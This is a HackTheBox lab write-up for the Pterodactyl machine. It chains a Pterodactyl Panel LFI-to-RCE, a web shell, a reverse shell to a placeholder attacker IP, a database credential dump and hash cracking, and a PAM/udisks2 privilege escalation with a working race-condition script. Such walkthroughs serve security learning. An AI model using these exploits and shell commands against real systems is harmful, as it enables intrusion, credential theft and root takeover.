# HackTheBox — Pterodactyl
### Season 10: Underground | Difficulty: Medium | OS: Linux (openSUSE Leap 15.6)

---

## Table of Contents

1. [Overview](#overview)
2. [Reconnaissance](#reconnaissance)
3. [Initial Foothold — CVE-2025-49132 (Unauthenticated RCE)](#initial-foothold)
4. [Pivoting to SSH — Database Credential Extraction](#pivoting-to-ssh)
5. [Privilege Escalation — CVE-2025-6018 + CVE-2025-6019](#privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)

---

## Overview

Pterodactyl is a medium-difficulty Linux machine on HackTheBox Season 10: Underground. The attack chain requires three distinct phases: exploitation of an unauthenticated RCE vulnerability in the Pterodactyl Panel web application, lateral movement via extracted database credentials, and a sophisticated two-stage privilege escalation chaining a PAM environment injection bypass (CVE-2025-6018) with a TOCTOU race condition in udisks2 (CVE-2025-6019).

**Exploit Chain Summary:**

```
Unauthenticated HTTP → CVE-2025-49132 (RCE) → shell as wwwrun
  → MySQL credential extraction → SSH as phileasfogg3 (user flag)
    → CVE-2025-6018 (PAM bypass → Active session) + CVE-2025-6019 (XFS race → euid=0)
      → root flag
```

**Skills required:** Web exploitation, LFI-to-RCE via pearcmd, database enumeration, PAM internals, D-Bus/Polkit/UDisks2 interaction, race condition exploitation.

---

## Reconnaissance

### Port Scanning

```bash
nmap -sC -sV -oA nmap/pterodactyl 10.129.1.228
```

**Open ports:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH |
| 80/tcp | HTTP | nginx |

### Virtual Host Enumeration

The main HTTP service serves a Minecraft-themed web application. Fuzzing the `Host` header reveals a secondary virtual host:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://10.129.1.228 -H "Host: FUZZ.pterodactyl.htb" \
     -fw <baseline_word_count>
```

**Result:** `panel.pterodactyl.htb` — a Pterodactyl Panel instance running version **1.11.10**.

Add both hosts to `/etc/hosts`:

```
10.129.1.228  pterodactyl.htb panel.pterodactyl.htb
```

---

## Initial Foothold

### CVE-2025-49132 — Unauthenticated RCE via LFI + Pearcmd

#### Vulnerability Analysis

Pterodactyl Panel version 1.11.10 contains a path traversal vulnerability in the localization endpoint. The application loads PHP language files based on user-controlled `locale` and `namespace` URL parameters without adequate sanitization, resulting in an unauthenticated **Local File Inclusion (LFI)** primitive. The loader appends a `.php` extension to the resolved path, restricting inclusion to PHP files only — but this constraint is bypassed using the `pearcmd.php` technique.

#### Phase 1: Data Exfiltration via LFI

The LFI is leveraged to include Laravel configuration files and leak sensitive data:

- **`config/database.php`** → leaks MySQL credentials: `pterodactyl` / `PteraPanel`
- **`config/app.php`** → leaks the Laravel `APP_KEY` (used for session signing and encryption)

#### Phase 2: LFI → RCE via Pearcmd

Since `pearcmd.php` is present on the server (a PEAR installation artifact), it can be triggered through the LFI. The PEAR CLI script interprets URL parameters as command-line arguments, which allows an attacker to invoke `pearcmd`'s config-create functionality to **write arbitrary PHP content to a file path of the attacker's choosing**.

**Attack flow:**

1. Craft a request that includes `pearcmd.php` through the LFI endpoint, passing a URL-encoded payload that instructs PEAR to write a PHP web shell (e.g., `<?php system($_GET['cmd']); ?>`) to a publicly accessible path such as `/tmp/shell.php`.
2. Use the original LFI endpoint to include `/tmp/shell.php`, triggering execution of the web shell.

**Result:** Remote code execution as `wwwrun` (the PHP-FPM worker user).

#### Establishing a Stable Shell

With RCE confirmed, establish a reverse shell using a named pipe (mkfifo):

```bash
# On attacker machine
nc -lvnp 4444

# Via web shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <ATTACKER_IP> 4444 > /tmp/f
```

**Shell:** `wwwrun@pterodactyl`

---

## Pivoting to SSH

### Database Credential Extraction

With a shell as `wwwrun`, the Laravel `.env` file in the web root is accessible and contains database credentials in plaintext:

```bash
cat /var/www/pterodactyl/.env
```

**Key values extracted:**
- `DB_HOST`, `DB_DATABASE`, `DB_USERNAME`, `DB_PASSWORD`
- `APP_KEY` (for session forgery if needed)

### Dumping User Credentials

Connect to MySQL and dump the `users` table:

```bash
mysql -u pterodactyl -pPteraPanel pterodactyl \
  -e "SELECT id, username, email, password, root_admin FROM users;"
```

This reveals user accounts including `headmonitor` and their bcrypt password hashes (`$2y$10$...`).

### Hash Cracking

The extracted bcrypt hash is run through Hashcat:

```bash
hashcat -m 3200 '<hash>' /usr/share/wordlists/rockyou.txt
```

**Result:** Plaintext password for user `phileasfogg3` (the SSH-accessible local user).

### SSH Access and User Flag

```bash
ssh phileasfogg3@10.129.1.228
```

```bash
cat ~/user.txt
```

**User flag captured.**

---

## Privilege Escalation

The privilege escalation chains two CVEs affecting **openSUSE Leap 15.6** specifically. Standard vectors (sudo, SUID, capabilities, writable cron jobs) are not available.

### CVE-2025-6018 — PAM Environment Variable Injection (Session Spoofing)

#### Background

On SUSE/openSUSE systems, PAM's `pam_env` module reads `~/.pam_environment` with `user_readenv=1` (enabled by default). This allows a local user to inject arbitrary environment variables into their own PAM session at login time.

**Polkit** grants elevated `allow_active` privileges to sessions that are considered "locally active" — i.e., sessions where `loginctl show-session` reports `Active=yes` and `Seat=seatX`. Normally, SSH sessions are marked `Active=no` because they are not associated with a physical seat.

#### Exploitation

By injecting `XDG_SEAT` and `XDG_VTNR` variables into `~/.pam_environment`, the SSH session is tricked into appearing as a local console session to `systemd-logind`, which then marks it as `Active=yes`:

```bash
cat > ~/.pam_environment << 'EOF'
XDG_SEAT=seat0
XDG_VTNR=1
EOF
```

**Critical:** This file must exist **before** the PAM session is created. After writing the file, exit the SSH session completely and reconnect. The new session will have the injected variables applied.

**Verification:**

```bash
loginctl show-session $(loginctl | grep $USER | awk '{print $1}') | grep -E "Active|Seat|Type"
```

**Expected output:**
```
Seat=seat0
Type=tty
Active=yes
```

**Effect:** The session now satisfies Polkit's `allow_active: yes` requirement for `org.freedesktop.udisks2` actions, allowing `udisksctl loop-setup` to run without authentication.

---

### CVE-2025-6019 — udisks2/libblockdev XFS Resize TOCTOU Race Condition

#### Background

`udisks2` provides a D-Bus interface for disk management operations. When a user calls `Filesystem.Resize` on a loop device, `libblockdev` (the backend library) needs to temporarily mount the filesystem to a path under `/tmp/blockdev.<random>/` to perform the resize operation.

**The vulnerability:** During this transient mount window, the filesystem is mounted **without the `nosuid` flag**. This creates a Time-of-Check-Time-of-Use (TOCTOU) race condition: if the mounted image contains a SUID-root binary, an attacker can execute it during this brief window before the nosuid restriction is applied, gaining `euid=0`.

#### Phase 1: Craft the Malicious XFS Image (Attacker Machine)

The image must be created on the attacker machine as root to properly set the SUID bit. Critically, the binary placed inside must be the **target machine's own bash binary** to avoid architecture/version mismatches:

```bash
# Copy victim's bash binary
scp phileasfogg3@10.129.1.228:/usr/bin/bash /tmp/victim_bash

# Create and populate XFS image
sudo bash -c "
  dd if=/dev/zero of=xfs_exploit.img bs=1M count=310
  mkfs.xfs -f xfs_exploit.img
  mkdir -p /mnt/xfs_tmp
  mount -o loop xfs_exploit.img /mnt/xfs_tmp
  cp /tmp/victim_bash /mnt/xfs_tmp/xpl
  chown root:root /mnt/xfs_tmp/xpl
  chmod 4755 /mnt/xfs_tmp/xpl       # Set SUID bit
  ls -la /mnt/xfs_tmp/xpl           # Verify: must show -rwsr-xr-x
  umount /mnt/xfs_tmp
"

# Transfer to target
scp xfs_exploit.img phileasfogg3@10.129.1.228:/tmp/xfs.img
```

**Important:** The `ls` output must show `-rwsr-xr-x`. If the `s` is missing, the SUID bit was not set correctly and the exploit will fail.

#### Phase 2: Execute the Race Condition (Target Machine)

With `Active=yes` confirmed, the exploit proceeds:

1. **Create the loop device** from the XFS image via udisksctl (no password required due to CVE-2025-6018):

```bash
udisksctl loop-setup -f /tmp/xfs.img
# Output: Mapped file /tmp/xfs.img as /dev/loop0
```

2. **Launch the race catcher** in the background — this monitors `/tmp/blockdev.*/` for the SUID binary and executes it immediately when found:

```bash
(while true; do
  for d in /tmp/blockdev.*/; do
    if [[ -x "${d}xpl" ]]; then
      "${d}xpl" -p -c 'id; cat /root/root.txt'
    fi
  done
  sleep 0.01
done) &
RACE_PID=$!
```

3. **Trigger the XFS resize** via D-Bus — this causes libblockdev to perform the transient nosuid-free mount:

```bash
LOOP_NAME="loop0"
gdbus call --system \
  --dest org.freedesktop.UDisks2 \
  --object-path "/org/freedesktop/UDisks2/block_devices/$LOOP_NAME" \
  --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
```

4. The race catcher wins the window and executes the SUID binary:

```
=== ROOT SHELL OBTAINED ===
uid=1002(phileasfogg3) gid=100(users) euid=0(root) groups=100(users)
<root flag contents>
```

#### Using the Automated PoC

Alternatively, the exploit can be executed using the public PoC from [DesertDemons/CVE-2025-6018-6019](https://github.com/DesertDemons/CVE-2025-6018-6019):

```bash
# Setup PAM bypass
./exploit.sh --setup
# (exit and reconnect SSH)

# Run exploit
./exploit.sh --exploit /tmp/xfs.img
```

---

## Flags

| Flag | Location | Method |
|------|----------|--------|
| `user.txt` | `/home/phileasfogg3/user.txt` | SSH after cracking hash from DB |
| `root.txt` | `/root/root.txt` | Executed via SUID bash with `euid=0` during XFS resize TOCTOU window |

---

## Key Takeaways

**1. Active session status is more powerful than a password.**
In modern Linux environments with Polkit, what matters is not just *who* you are, but *where* your session is authenticated. Gaining `allow_active` status by spoofing PAM environment variables bypassed all traditional authentication requirements for udisks2 operations.

**2. TOCTOU vulnerabilities in privileged daemons are devastating.**
The XFS resize race condition is a perfect example of how a transient, temporary state (a brief mount window without nosuid) can be weaponized. The window exists for only milliseconds, but that is enough.

**3. The attack surface is the interaction between components.**
Neither Polkit, PAM, nor udisks2 is individually broken. The vulnerability emerges from how they interact: PAM sets environment variables → systemd-logind reads them to determine session class → Polkit trusts that classification → udisks2 receives elevated permissions → libblockdev creates a nosuid-free mount. Each component behaves as designed; the exploit lives in the gap between them.

**4. Architecture compatibility matters for binary exploitation.**
The XFS image must contain the *target machine's own binary*, not a binary compiled or copied from the attacker machine. Using `/usr/bin/bash` from the victim avoids glibc version mismatches and ELF architecture issues.

**5. Image preparation must be verified before transfer.**
Always verify SUID bits (`-rwsr-xr-x`) on the payload binary after creating the image and before transferring it. The bit is set at image creation time and must be intact inside the XFS filesystem.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| ffuf | Virtual host / subdomain fuzzing |
| curl | Manual HTTP request crafting |
| PHP pearcmd | LFI-to-RCE escalation vector |
| mkfifo | Stable reverse shell |
| MySQL client | Database credential extraction |
| Hashcat | bcrypt hash cracking |
| dd + mkfs.xfs | Malicious XFS image creation |
| udisksctl | Loop device management (CVE-2025-6018/6019) |
| gdbus | Direct D-Bus method invocation |
| CVE-2025-6018-6019 PoC | Automated PAM bypass + race condition |

---

*Write-up author: [Luiz Gustavo Santos Veríssimo]*
*Machine retired: TBD | Season 10: Underground*
*Published in accordance with HackTheBox responsible disclosure guidelines.*
